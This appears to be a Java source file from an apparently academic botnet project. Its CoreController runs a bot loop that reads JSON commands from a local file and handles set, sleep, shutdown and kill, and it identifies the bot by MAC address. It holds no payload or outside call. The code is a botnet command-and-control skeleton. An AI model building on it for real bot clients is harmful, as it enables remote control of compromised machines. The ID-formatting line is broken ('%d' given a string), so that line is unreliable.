/*
  The MIT License (MIT)

  Copyright (c) 2016 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.core;

import com.acmutv.botnet.config.AppConfigurationService;
import com.acmutv.botnet.core.command.BotCommand;
import com.acmutv.botnet.core.command.BotCommandParser;
import com.acmutv.botnet.core.pool.BotPool;
import com.acmutv.botnet.core.state.BotState;
import com.acmutv.botnet.tool.runtime.RuntimeManager;
import com.acmutv.botnet.tool.net.ConnectionManager;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.TimeUnit;

/**
 * This class realizes the core business logic. *
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 */
public class CoreController {

  private static final Logger LOGGER = LogManager.getLogger(CoreController.class);

  private static String ID = generateId();
  private static BotState STATE = BotState.INIT;
  private static BotPool POOL = new BotPool();

  /**
   * The core main method.
   * It initializes and runs the bot.
   */
  public static void runBot() {
    while (true) {
      BotCommand cmd = getNextCommand();

      switch (cmd.getScope()) {

        case SET:
          //noinspection unchecked
          final Map<String,String> settings =
              (Map<String,String>) cmd.getParams().getOrDefault("settings", new HashMap<String,String>());
          LOGGER.trace("COMMAND :: SET :: settings={}\n", settings);
          set(settings);
          break;

        case SLEEP:
          long sleepTimeoutAmount = Long.valueOf(cmd.getParams().get("amount").toString());
          TimeUnit sleepTimeoutUnit = TimeUnit.valueOf(cmd.getParams().get("unit").toString());
          LOGGER.trace("COMMAND :: SLEEP :: amount={} ; unit={}", sleepTimeoutAmount, sleepTimeoutUnit);
          sleep(sleepTimeoutAmount, sleepTimeoutUnit);
          break;

        case SHUTDOWN:
          LOGGER.trace("COMMAND :: SHUTDOWN");
          long shutdownTimeoutAmount = Long.valueOf(cmd.getParams().get("amount").toString());
          TimeUnit shutdownTimeoutUnit = TimeUnit.valueOf(cmd.getParams().get("unit").toString());
          shutdown(shutdownTimeoutAmount, shutdownTimeoutUnit);
          return;

        case KILL:
          LOGGER.trace("COMMAND :: KILL");
          kill();
          return;

        default:
          LOGGER.trace("COMMAND :: UNKNOWN");
          break;
      }
    }
  }

  private static String generateId() {
    final String mac = ConnectionManager.getMAC();
    final String pid = RuntimeManager.getJvmName();
    final String id = String.format("%s-%d", mac, pid);
    return LOGGER.traceExit(id);
  }

  private static BotCommand getNextCommand() {
    LOGGER.traceEntry();
    final String path = AppConfigurationService.getConfigurations().getCmdResource();
    BotCommand cmd = null;
    try (InputStream stream = new FileInputStream(path)) {
      cmd = BotCommandParser.fromJson(stream);
    } catch (FileNotFoundException e) {
      LOGGER.error(e.getMessage());
      cmd = new BotCommand();
    } catch (IOException e) {
      LOGGER.error(e.getMessage());
    }

    return LOGGER.traceExit(cmd);
  }

  private static void set(Map<String,String> settings) {
    LOGGER.traceEntry("settings={}", settings);
    for (Map.Entry<String,String> setting : settings.entrySet()) {
      LOGGER.trace("Setting {} = {}", setting.getKey(), setting.getValue());
    }
  }

  private static void sleep(long amount, TimeUnit unit) {
    LOGGER.traceEntry("amount={} unit={}", amount, unit);
    try {
      unit.sleep(amount);
    } catch (InterruptedException e) {
      LOGGER.trace(e.getMessage());
    }
  }

  private static void shutdown(long amount, TimeUnit unit) {
    LOGGER.traceEntry("amount={} unit={}", amount, unit);
    POOL.shutdown(amount, unit);
  }

  private static void kill() {
    LOGGER.traceEntry();
    POOL.kill();
  }

}
